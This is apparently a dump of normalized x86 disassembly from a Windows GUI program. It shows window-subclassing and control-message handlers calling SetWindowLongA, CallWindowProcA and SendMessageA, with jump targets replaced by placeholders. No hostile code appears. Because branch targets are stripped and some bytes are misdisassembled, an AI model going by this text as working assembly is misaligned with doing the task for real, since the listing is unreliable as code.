jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439118
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x295 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43c33c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_439140
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439219
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0x82
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x264 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x260 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
push ebp
call sub_439004
pop ecx
jmp r-xdata
sub_439238
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439319
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f658
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f570
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f720
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_439338
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45071c
mov ecx edi
mov edx esi
call sub_429f3c
pop edi
pop esi
pop ebx
retn
sub_439358
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_43b384
cmp [ ebx + 0x277 ] 0x0
je r-xdata
mov esi 0x4
cmp [ ebx + 0x278 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x27a ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x275 ] 0x0
je r-xdata
or esi 0x20
cmp [ ebx + 0x276 ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x294 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x279 ] 0x1
je r-xdata
or esi 0x2000
mov al [ r-xdata ]
and al [ ebx + 0x279 ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x279 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x279 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_45071c
mov edx esi
call sub_42a1a0
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_43b384
sub_439454
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x22c ]
call sub_437d74
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x24c ]
call sub_403154
xor eax eax
mov [ ebx + 0x24c ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
mov al [ eax + 0x2a ]
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
pop edx
call sub_437750
mov edx esp
mov ecx 0x1
mov ebp [ eax ]
call [ ebp + 0xc ]
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
mov dl [ esp ]
call sub_437750
jmp r-xdata
mov eax [ ebx + 0x24c ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_4394e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x24c ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41ab48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x24c ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x24c ]
call sub_41aae4
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x22c ]
call sub_437d74
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_437da4
call sub_43770c
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x24c ]
mov ebp [ eax ]
call [ ebp + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_439564
push ebx
push esi
push edi
mov ebx eax
cmp dl [ ebx + 0x274 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x274 ] dl
mov eax ebx
call sub_439358
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_437d74
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_439454
jmp r-xdata
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
call sub_437bec
push eax
mov eax ebx
call sub_45071c
pop edx
call sub_42a0d8
test eax eax
setne al
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
pop edx
mov [ eax + 0x2a ] dl
inc esi
dec edi
jne r-xdata
sub_43960c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x279 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x279 ] al
mov eax ebx
call sub_439358
sub_439634
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x244 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x22c ]
call sub_437e68
mov [ esi + 0x244 ] bl
mov eax esi
call sub_44dcbc
sub_4396d8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_437da4
mov cl 0x1
mov edx 0x3
call sub_437900
mov eax ebx
call sub_43b44c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43b44c
xor ecx ecx
mov edx 0x3
call sub_437900
pop esi
pop ebx
retn
sub_439768
push ebx
mov ebx eax
mov eax [ ebx + 0x70 ]
call sub_423b68
push eax
mov eax ebx
call sub_45071c
pop edx
call sub_42a038
mov eax [ ebx + 0x70 ]
call sub_423b68
push eax
mov eax ebx
call sub_45071c
pop edx
call sub_429e00
pop ebx
retn
sub_43979c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x268 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x268 ] esi
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax ebx
call sub_45071c
mov edx esi
call sub_42a154
sub_4397cc
push ebx
mov ebx eax
mov eax ebx
call sub_44fc50
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_439768
sub_4397f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44fd34
pop esi
pop ebx
retn
mov eax ebx
call sub_44dcbc
sub_439814
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439a13
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_44ea2c
mov eax ebx
call sub_439a44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a1a
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov eax [ esi + 0x8 ]
mov eax [ eax ]
cmp eax [ ebx + 0x264 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffec9
je r-xdata
mov [ ebx + 0x295 ] 0x1
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax edx
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov edx [ eax + 0xc ]
mov eax ebx
call sub_43c33c
mov esi eax
mov eax [ esi + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
mov edi edx
mov edx [ edi + 0xc ]
mov eax ebx
call sub_43c33c
mov esi eax
mov eax ebx
call sub_45071c
mov edx [ edi + 0xc ]
call sub_429fc8
mov edx eax
mov eax esi
call sub_436ea0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
call GetMessagePos
call sub_406ac4
movzx eax ax
push eax
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0x8 ]
pop edx
call sub_405fd0
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449964
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax ebx
call sub_45071c
push eax
call ChildWindowFromPoint
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax esi
call sub_436ea0
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov eax ebx
call sub_45071c
cmp esi eax
je r-xdata
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0xc ]
mov edx 0x50
call sub_40459c
mov eax [ ebp - 0xc ]
call sub_404210
push eax
mov eax [ ebp - 0xc ]
call sub_404410
push eax
push esi
call GetClassNameA
mov edx eax
lea eax [ ebp - 0xc ]
call sub_40459c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40435c
jne r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449964
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push 0x1206
push esi
call SendMessageA
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43c33c
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax ebx
mov si 0xffaf
call sub_403350
sub_439a50
push ebx
mov ebx eax
mov eax ebx
call sub_44fc78
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_439748
mov eax ebx
call sub_439a44
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x264 ]
push eax
call InvalidateRect
sub_439ab8
push ebx
push esi
mov esi edx
mov ebx [ eax + 0x234 ]
mov dl [ esi + 0x8 ]
mov eax ebx
call sub_438720
mov dl [ esi + 0x9 ]
mov eax ebx
call sub_438734
mov dl [ esi + 0xa ]
mov eax ebx
call sub_438748
pop esi
pop ebx
retn
sub_439ae4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x215 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x215 ] dl
mov eax ebx
call sub_450a20
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
mov esi eax
and esi 0xfffffffc
xor eax eax
mov al [ ebx + 0x215 ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_45071c
push eax
call SetWindowLongA
mov eax ebx
call sub_43b6ac
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x234 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_43b68c
mov dl 0x3
mov eax ebx
call sub_43b68c
jmp r-xdata
sub_439b68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f91c
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x264 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x260 ] eax
mov eax [ ebx + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x264 ]
push eax
call SetWindowLongA
sub_439bb8
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_43b44c
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43b44c
call sub_437bec
mov esi eax
sub_439be0
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
pop ebx
retn
sub_439c08
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_439c54
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
mov al 0x1
pop ebx
retn
sub_439c7c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
xor eax eax
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_439cb0
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x372 ] 0x0
je r-xdata
mov ecx [ ebx + 0x22c ]
mov dl 0x1
mov eax [ esp ]
call sub_437610
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
sub_439cfc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_439d48
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_439e69
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x22c ]
call sub_437da4
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e70
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax ebx
call sub_439cfc
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f50
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_408904
jmp r-xdata
mov cl [ ebp - 0x5 ]
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x9 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_403fa4
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_439e90
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_439eb4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_439efd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff5c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43abb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff97
jg r-xdata
cmp eax 0xffffff9c
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_439d48
mov edi eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_403350
test al al
jne r-xdata
cmp eax 0xffffff8d
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437da4
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403350
test al al
jne r-xdata
sub eax 0xffffff98
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff8f
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43abb9
lea eax [ ebp - 0x9c ]
call sub_403f50
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov edx [ ebp - 0x8 ]
mov ebx esi
xor edx edx
push ebp
push sub_43a6dd
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_424c0c
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebx + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x231 ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437d74
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
call sub_429f70
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x14 ]
call sub_439eb4
push eax
mov eax [ ebx + 0x18 ]
call sub_439eb4
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
jmp r-xdata
sub eax 0xfffffecc
je r-xdata
test eax 0x20000
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_437da4
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403350
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x28 ]
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403350
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x97
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x28
call sub_402b5c
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x58 ] eax
test [ ebx + 0xc ] 0x10002
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437da4
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403350
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43b440
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403350
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b440
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35a ] 0x0
je r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebx + 0xc ]
test eax 0x10001
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
call sub_4039b4
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_43a16d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425038
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424ed8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424ef4
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425038
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437da4
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403350
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b440
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b440
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b440
pop edx
call sub_436ea0
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454fe8
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a6b8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
